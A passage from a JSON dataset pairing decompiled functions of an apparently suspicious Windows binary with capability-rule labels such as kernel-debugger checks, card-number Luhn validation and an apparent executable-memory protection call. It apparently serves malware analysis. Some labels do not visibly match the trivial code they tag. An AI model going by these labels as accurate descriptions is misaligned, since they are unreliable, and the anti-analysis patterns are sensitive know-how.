            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e6b5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4e7430 ^ &stack0xfffffffc;\n    fcn.00404ba7(arg_10h);\n    var_14h = fcn.00407f02(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040b7b7(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e70e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e74e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e740:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e74e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e740;\n        goto code_r0x0040e70e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e74e:\n    fcn.00407ef3(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "004047f1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004047f1(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4011d0;\n    fcn.004047c8();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040512b();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00404f7d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f7d(uint32_t arg_8h)\n\n{\n    fcn.00404f6d();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040512b();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040d399": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d399(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004055b0(0x4e57a8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040518b();\n        *puVar2 = 0;\n        puVar2 = fcn.00405178();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4f67cc)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4f67e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040cbd6(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00405178();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040518b();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040cc9c(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040d465();\n                goto code_r0x0040d45c;\n            }\n        }\n        puVar2 = fcn.0040518b();\n        *puVar2 = 0;\n        puVar2 = fcn.00405178();\n        *puVar2 = 9;\n        fcn.004055a0();\n    }\ncode_r0x0040d45c:\n    fcn.004055f5();\n    return;\n}\n",
        "token_count": 615
    },
    "0040e040": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040e040(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint *puVar18;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar18 = (arg_10h - 4) + arg_8h;\n        if ((puVar18 & 3) == 0) {\n            uVar16 = arg_10h >> 2;\n            if (uVar16 < 8) goto code_r0x0040e228;\n            for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar18 = puVar18 + -1;\n            }\n    // switch table (4 cases) at 0x40e34c\n            switch(*((arg_10h & 3) * 4 + 0x40e34c)) {\n            case 0x40e364:\ncode_r0x0040e364:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40e374:\ncode_r0x0040e374:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40e388:\ncode_r0x0040e388:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                *(puVar18 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40e34c\n            switch(*(arg_10h * 4 + 0x40e34c)) {\n            case 0x40e364:\n                goto code_r0x0040e364;\n            case 0x40e374:\n                goto code_r0x0040e374;\n            case 0x40e388:\n                goto code_r0x0040e388;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar18 & 3);\n            switch(*((puVar18 & 3) * 4 + 0x40e250)) {\n            case 0x40e260:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar16 = arg_10h >> 2;\n                puVar18 = puVar18 - 1;\n                if (uVar16 < 8) {\ncode_r0x0040e228:\n    // WARNING: Could not recover jumptable at 0x0040e22a. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40e2fc\n                    puVar18 = (**(uVar16 * -4 + 0x40e2fc))();\n                    return puVar18;\n                }\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40e34c)) {\n                case 0x40e364:\n                    goto code_r0x0040e364;\n                case 0x40e374:\n                    goto code_r0x0040e374;\n                case 0x40e388:\n                    goto code_r0x0040e388;\n                }\n                break;\n            case 0x40e284:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar18 = puVar18 - 2;\n                if (uVar16 < 8) goto code_r0x0040e228;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40e34c)) {\n                case 0x40e364:\n                    goto code_r0x0040e364;\n                case 0x40e374:\n                    goto code_r0x0040e374;\n                case 0x40e388:\n                    goto code_r0x0040e388;\n                }\n                break;\n            case 0x40e2ac:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar18 = puVar18 - 3;\n                if (uVar16 < 8) goto code_r0x0040e228;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40e34c)) {\n                case 0x40e364:\n                    goto code_r0x0040e364;\n                case 0x40e374:\n                    goto code_r0x0040e374;\n                case 0x40e388:\n                    goto code_r0x0040e388;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    if (((0x7f < arg_10h) && (*0x4f67a8 != 0)) && ((arg_8h & 0xf) == (arg_ch & 0xf))) {\n        puVar18 = arg_8h;\n        if ((arg_ch & 0xf) != 0) {\n            uVar17 = 0x10 - (arg_ch & 0xf);\n            arg_10h = arg_10h - uVar17;\n            for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        for (uVar16 = arg_10h >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {\n            uVar1 = arg_ch[1];\n            uVar2 = arg_ch[2];\n            uVar3 = arg_ch[3];\n            uVar4 = arg_ch[4];\n            uVar5 = arg_ch[5];\n            uVar6 = arg_ch[6];\n            uVar7 = arg_ch[7];\n            uVar8 = arg_ch[8];\n            uVar9 = arg_ch[9];\n            uVar10 = arg_ch[10];\n            uVar11 = arg_ch[0xb];\n            uVar12 = arg_ch[0xc];\n            uVar13 = arg_ch[0xd];\n            uVar14 = arg_ch[0xe];\n            uVar15 = arg_ch[0xf];\n            *puVar18 = *arg_ch;\n            puVar18[1] = uVar1;\n            puVar18[2] = uVar2;\n            puVar18[3] = uVar3;\n            puVar18[4] = uVar4;\n            puVar18[5] = uVar5;\n            puVar18[6] = uVar6;\n            puVar18[7] = uVar7;\n            puVar18[8] = uVar8;\n            puVar18[9] = uVar9;\n            puVar18[10] = uVar10;\n            puVar18[0xb] = uVar11;\n            puVar18[0xc] = uVar12;\n            puVar18[0xd] = uVar13;\n            puVar18[0xe] = uVar14;\n            puVar18[0xf] = uVar15;\n            uVar1 = arg_ch[0x11];\n            uVar2 = arg_ch[0x12];\n            uVar3 = arg_ch[0x13];\n            uVar4 = arg_ch[0x14];\n            uVar5 = arg_ch[0x15];\n            uVar6 = arg_ch[0x16];\n            uVar7 = arg_ch[0x17];\n            uVar8 = arg_ch[0x18];\n            uVar9 = arg_ch[0x19];\n            uVar10 = arg_ch[0x1a];\n            uVar11 = arg_ch[0x1b];\n            uVar12 = arg_ch[0x1c];\n            uVar13 = arg_ch[0x1d];\n            uVar14 = arg_ch[0x1e];\n            uVar15 = arg_ch[0x1f];\n            puVar18[0x10] = arg_ch[0x10];\n            puVar18[0x11] = uVar1;\n            puVar18[0x12] = uVar2;\n            puVar18[0x13] = uVar3;\n            puVar18[0x14] = uVar4;\n            puVar18[0x15] = uVar5;\n            puVar18[0x16] = uVar6;\n            puVar18[0x17] = uVar7;\n            puVar18[0x18] = uVar8;\n            puVar18[0x19] = uVar9;\n            puVar18[0x1a] = uVar10;\n            puVar18[0x1b] = uVar11;\n            puVar18[0x1c] = uVar12;\n            puVar18[0x1d] = uVar13;\n            puVar18[0x1e] = uVar14;\n            puVar18[0x1f] = uVar15;\n            arg_ch = arg_ch + 0x20;\n            puVar18 = puVar18 + 0x20;\n        }\n        if ((arg_10h & 0x7f) != 0) {\n            for (uVar16 = (arg_10h & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {\n                uVar1 = arg_ch[1];\n                uVar2 = arg_ch[2];\n                uVar3 = arg_ch[3];\n                *puVar18 = *arg_ch;\n                puVar18[1] = uVar1;\n                puVar18[2] = uVar2;\n                puVar18[3] = uVar3;\n                arg_ch = arg_ch + 4;\n                puVar18 = puVar18 + 4;\n            }\n            if ((arg_10h & 0xf) != 0) {\n                for (uVar16 = (arg_10h & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n                for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar18 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar17 = arg_10h >> 2;\n        if (uVar17 < 8) goto code_r0x0040e0c0;\n        for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n            *puVar18 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar18 = puVar18 + 1;\n        }\n    // switch table (4 cases) at 0x40e1b0\n        switch(*((arg_10h & 3) * 4 + 0x40e1b0)) {\n        case 0x40e1c8:\ncode_r0x0040e1c8:\n            *puVar18 = *arg_ch;\n            return arg_8h;\n        case 0x40e1d4:\ncode_r0x0040e1d4:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40e1e8:\ncode_r0x0040e1e8:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            *(puVar18 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40e1c0)) {\n        case 0x40e1c8:\n            goto code_r0x0040e1c8;\n        case 0x40e1d4:\n            goto code_r0x0040e1d4;\n        case 0x40e1e8:\n            goto code_r0x0040e1e8;\n        }\n    }\n    else {\n        uVar16 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40e0c4)) {\n        case 0x40e0d4:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar18 = arg_8h + 3;\n            if (uVar17 < 8) {\ncode_r0x0040e0c0:\n    // WARNING: Could not recover jumptable at 0x0040e0c0. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40e144\n                puVar18 = (**(uVar17 * 4 + 0x40e144))();\n                return puVar18;\n            }\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e1b0)) {\n            case 0x40e1c8:\n                goto code_r0x0040e1c8;\n            case 0x40e1d4:\n                goto code_r0x0040e1d4;\n            case 0x40e1e8:\n                goto code_r0x0040e1e8;\n            }\n            break;\n        case 0x40e100:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar18 = arg_8h + 2;\n            if (uVar17 < 8) goto code_r0x0040e0c0;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e1b0)) {\n            case 0x40e1c8:\n                goto code_r0x0040e1c8;\n            case 0x40e1d4:\n                goto code_r0x0040e1d4;\n            case 0x40e1e8:\n                goto code_r0x0040e1e8;\n            }\n            break;\n        case 0x40e124:\n            *arg_8h = *arg_ch;\n            uVar17 = uVar16 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar18 = arg_8h + 1;\n            if (uVar17 < 8) goto code_r0x0040e0c0;\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            switch(*((uVar16 & 3) * 4 + 0x40e1b0)) {\n            case 0x40e1c8:\n                goto code_r0x0040e1c8;\n            case 0x40e1d4:\n                goto code_r0x0040e1d4;\n            case 0x40e1e8:\n                goto code_r0x0040e1e8;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 4285
    },
    "004036a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004036a4(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "00403fba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403fba(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "00403fd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403fd4(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4f008c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4f66b8, 0x40346c);\n    var_4h = 0x40;\n    (**0x4f008c)(*0x4f6634, *0x4f679c, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 112
    },
    "00408bd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408bd5(uint arg_8h)\n\n{\n    fcn.00408a95(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "004093bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004093d0)\n// WARNING: Removing unreachable block (ram,0x004093d6)\n// WARNING: Removing unreachable block (ram,0x004093d8)\n\nvoid fcn.004093bc(void)\n\n{\n    return;\n}\n",
        "token_count": 63
    },
    "0040e760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040e760(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint *puVar18;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar18 = (arg_10h - 4) + arg_8h;\n        if ((puVar18 & 3) == 0) {\n            uVar16 = arg_10h >> 2;\n            if (uVar16 < 8) goto code_r0x0040e948;\n            for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar18 = puVar18 + -1;\n            }\n    // switch table (4 cases) at 0x40ea6c\n            switch(*((arg_10h & 3) * 4 + 0x40ea6c)) {\n            case 0x40ea84:\ncode_r0x0040ea84:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x40ea94:\ncode_r0x0040ea94:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x40eaa8:\ncode_r0x0040eaa8:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                *(puVar18 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x40ea6c\n            switch(*(arg_10h * 4 + 0x40ea6c)) {\n            case 0x40ea84:\n                goto code_r0x0040ea84;\n            case 0x40ea94:\n                goto code_r0x0040ea94;\n            case 0x40eaa8:\n                goto code_r0x0040eaa8;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar18 & 3);\n            switch(*((puVar18 & 3) * 4 + 0x40e970)) {\n            case 0x40e980:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar16 = arg_10h >> 2;\n                puVar18 = puVar18 - 1;\n                if (uVar16 < 8) {\ncode_r0x0040e948:\n    // WARNING: Could not recover jumptable at 0x0040e94a. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x40ea1c\n                    puVar18 = (**(uVar16 * -4 + 0x40ea1c))();\n                    return puVar18;\n                }\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ea6c)) {\n                case 0x40ea84:\n                    goto code_r0x0040ea84;\n                case 0x40ea94:\n                    goto code_r0x0040ea94;\n                case 0x40eaa8:\n                    goto code_r0x0040eaa8;\n                }\n                break;\n            case 0x40e9a4:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar18 = puVar18 - 2;\n                if (uVar16 < 8) goto code_r0x0040e948;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ea6c)) {\n                case 0x40ea84:\n                    goto code_r0x0040ea84;\n                case 0x40ea94:\n                    goto code_r0x0040ea94;\n                case 0x40eaa8:\n                    goto code_r0x0040eaa8;\n                }\n                break;\n            case 0x40e9cc:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar18 = puVar18 - 3;\n                if (uVar16 < 8) goto code_r0x0040e948;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x40ea6c)) {\n                case 0x40ea84:\n                    goto code_r0x0040ea84;\n                case 0x40ea94:\n                    goto code_r0x0040ea94;\n                case 0x40eaa8:\n                    goto code_r0x0040eaa8;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    if (((0x7f < arg_10h) && (*0x4f67a8 != 0)) && ((arg_8h & 0xf) == (arg_ch & 0xf))) {\n        puVar18 = arg_8h;\n        if ((arg_ch & 0xf) != 0) {\n            uVar17 = 0x10 - (arg_ch & 0xf);\n            arg_10h = arg_10h - uVar17;\n            for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        for (uVar16 = arg_10h >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {\n            uVar1 = arg_ch[1];\n            uVar2 = arg_ch[2];\n            uVar3 = arg_ch[3];\n            uVar4 = arg_ch[4];\n            uVar5 = arg_ch[5];\n            uVar6 = arg_ch[6];\n            uVar7 = arg_ch[7];\n            uVar8 = arg_ch[8];\n            uVar9 = arg_ch[9];\n            uVar10 = arg_ch[10];\n            uVar11 = arg_ch[0xb];\n            uVar12 = arg_ch[0xc];\n            uVar13 = arg_ch[0xd];\n            uVar14 = arg_ch[0xe];\n            uVar15 = arg_ch[0xf];\n            *puVar18 = *arg_ch;\n            puVar18[1] = uVar1;\n            puVar18[2] = uVar2;\n            puVar18[3] = uVar3;\n            puVar18[4] = uVar4;\n            puVar18[5] = uVar5;\n            puVar18[6] = uVar6;\n            puVar18[7] = uVar7;\n            puVar18[8] = uVar8;\n            puVar18[9] = uVar9;\n            puVar18[10] = uVar10;\n            puVar18[0xb] = uVar11;\n            puVar18[0xc] = uVar12;\n            puVar18[0xd] = uVar13;\n            puVar18[0xe] = uVar14;\n            puVar18[0xf] = uVar15;\n            uVar1 = arg_ch[0x11];\n            uVar2 = arg_ch[0x12];\n            uVar3 = arg_ch[0x13];\n            uVar4 = arg_ch[0x14];\n            uVar5 = arg_ch[0x15];\n            uVar6 = arg_ch[0x16];\n            uVar7 = arg_ch[0x17];\n            uVar8 = arg_ch[0x18];\n            uVar9 = arg_ch[0x19];\n            uVar10 = arg_ch[0x1a];\n            uVar11 = arg_ch[0x1b];\n            uVar12 = arg_ch[0x1c];\n            uVar13 = arg_ch[0x1d];\n            uVar14 = arg_ch[0x1e];\n            uVar15 = arg_ch[0x1f];\n            puVar18[0x10] = arg_ch[0x10];\n            puVar18[0x11] = uVar1;\n            puVar18[0x12] = uVar2;\n            puVar18[0x13] = uVar3;\n            puVar18[0x14] = uVar4;\n            puVar18[0x15] = uVar5;\n            puVar18[0x16] = uVar6;\n            puVar18[0x17] = uVar7;\n            puVar18[0x18] = uVar8;\n            puVar18[0x19] = uVar9;\n            puVar18[0x1a] = uVar10;\n            puVar18[0x1b] = uVar11;\n            puVar18[0x1c] = uVar12;\n            puVar18[0x1d] = uVar13;\n            puVar18[0x1e] = uVar14;\n            puVar18[0x1f] = uVar15;\n            arg_ch = arg_ch + 0x20;\n            puVar18 = puVar18 + 0x20;\n        }\n        if ((arg_10h & 0x7f) != 0) {\n            for (uVar16 = (arg_10h & 0x7f) >> 4; uVar16 != 0; uVar16 = uVar16 - 1) {\n                uVar1 = arg_ch[1];\n                uVar2 = arg_ch[2];\n                uVar3 = arg_ch[3];\n                *puVar18 = *arg_ch;\n                puVar18[1] = uVar1;\n                puVar18[2] = uVar2;\n                puVar18[3] = uVar3;\n                arg_ch = arg_ch + 4;\n                puVar18 = puVar18 + 4;\n            }\n            if ((arg_10h & 0xf) != 0) {\n                for (uVar16 = (arg_10h & 0xf) >> 2; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n                for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + 1;\n                    puVar18 = puVar18 + 1;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar18 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar17 = arg_10h >> 2;\n        if (uVar17 < 8) goto code_r0x0040e7e0;\n        for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n            *puVar18 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar18 = puVar18 + 1;\n        }\n    // switch table (4 cases) at 0x40e8d0\n        switch(*((arg_10h & 3) * 4 + 0x40e8d0)) {\n        case 0x40e8e8:\ncode_r0x0040e8e8:\n            *puVar18 = *arg_ch;\n            return arg_8h;\n        case 0x40e8f4:\ncode_r0x0040e8f4:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x40e908:\ncode_r0x0040e908:\n            *puVar18 = *arg_ch;\n            *(puVar18 + 1) = *(arg_ch + 1);\n            *(puVar18 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x40e8e0)) {\n        case 0x40e8e8:\n            goto code_r0x0040e8e8;\n        case 0x40e8f4:\n            goto code_r0x0040e8f4;\n        case 0x40e908:\n            goto code_r0x0040e908;\n        }\n    }\n    else {\n        uVar16 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x40e7e4)) {\n        case 0x40e7f4:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar17 = uVar16 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar18 = arg_8h + 3;\n            if (uVar17 < 8) {\ncode_r0x0040e7e0:\n    // WARNING: Could not recover jumptable at 0x0040e7e0. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x40e864\n                puVar18 = (**(uVar17 * 4 + 0x40e864))();\n                return puVar18;\n            }\n            for (; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 